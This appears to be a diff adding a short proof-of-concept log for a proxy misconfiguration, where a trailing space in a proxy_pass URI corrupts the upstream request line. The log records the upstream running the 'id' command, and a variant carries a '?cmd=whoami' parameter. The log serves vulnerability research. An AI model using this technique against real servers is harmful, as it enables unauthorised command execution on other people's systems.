@@ -1,0 +1,11 @@
+# config: location /api { proxy_pass "http://backend/exec "; }  -- the URI ends in a quoted space
+# CTL: GET /hello.txt -> 200 ALPHA while the same server is serving the proxy location
+CTL GET /hello.txt -> 200 body=ALPHA
+# single request, no query, no percent-encoding:
+POC GET /api -> 200
+UPSTREAM_LINE=b'GET /exec  HTTP/1.1' TOKS=4
+   EXEC_CMD='id' OUT=b'uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)\n'
+# two spaces = config space + request-line space -> 4 tokens -> whitespace-splitting upstream executes default cmd
+# adding a query makes the attacker's command reachable but leaves 5 tokens:
+POC GET /api?cmd=whoami -> 200
+UPSTREAM_LINE=b'GET /exec  ?cmd=whoami HTTP/1.1' TOKS=5
